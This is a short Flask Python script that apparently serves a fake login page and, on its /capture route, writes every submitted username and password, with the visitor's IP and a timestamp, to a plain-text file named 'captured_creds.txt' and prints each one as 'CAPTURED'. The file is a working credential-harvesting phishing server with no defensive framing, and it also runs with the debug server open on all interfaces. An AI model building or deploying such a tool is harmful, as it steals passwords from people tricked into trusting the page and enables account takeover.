from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = f"[{timestamp}] IP: {ip} | User: {username} | Pass: {password}\n"

    with open('captured_creds.txt', 'a') as f:
        f.write(log_entry)

    print(f"[!] CAPTURED → {username}:{password}")
    return render_template('connected.html')

app.run(host='0.0.0.0', port=8080, debug=True)
